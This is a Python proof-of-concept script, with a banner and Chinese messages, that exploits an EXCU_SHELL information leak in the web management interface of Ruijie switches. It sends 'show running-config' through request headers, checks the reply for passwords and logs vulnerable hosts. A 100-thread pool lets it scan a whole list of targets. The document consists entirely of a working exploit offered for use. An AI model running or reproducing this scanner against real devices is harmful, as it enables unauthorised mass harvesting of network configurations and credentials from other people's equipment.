import requests,sys,argparse
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test = """

                ██████╗ ██╗   ██╗██╗     ██╗██╗███████╗
                ██╔══██╗██║   ██║██║     ██║██║██╔════╝
                ██████╔╝██║   ██║██║     ██║██║█████╗  
                ██╔══██╗██║   ██║██║██   ██║██║██╔══╝  
                ██║  ██║╚██████╔╝██║╚█████╔╝██║███████╗
                ╚═╝  ╚═╝ ╚═════╝ ╚═╝ ╚════╝ ╚═╝╚══════╝
                                                            author:秋妤
                                                            date:2024.10.04
                                                            version:1.0

    """
    print(test)


def poc(target):
    payload_url = "/EXCU_SHELL"
    url = target+payload_url
    headers={
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.2852.74 Safari/537.36',
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Connection': 'close',
        'Cmdnum': '"1"',
        'Command1': 'show running-config',
        'Confirm1': 'n'
    }
    try:
        res = requests.get(url=url,headers=headers,verify=False,timeout=10)
        if res.status_code == 200 and 'password' in res.text :
            print(f"[+]该url存在漏洞{target}")
            with open('锐捷_result.txt','a',encoding='utf-8') as fp:
                        fp.write(target+"\n")
                        return True
        else:
            print(f"[-]该url不存在漏洞{target}")
    except :
        print(f"[*]该url存在问题{target}")
        return False

def main():
    banner()
    parser = argparse.ArgumentParser(description="这是一个锐捷交换机 WEB 管理系统 EXCU_SHELL 信息泄露的脚本")
    parser.add_argument("-u", "--url", dest="url", type=str, help="Please enter url")
    parser.add_argument("-f", "--file", dest="file", type=str, help="Please enter file")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file ,'r' ,encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n' ,''))
        mp = Pool(100)
        mp.map(poc ,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")


if __name__ == '__main__':
    main()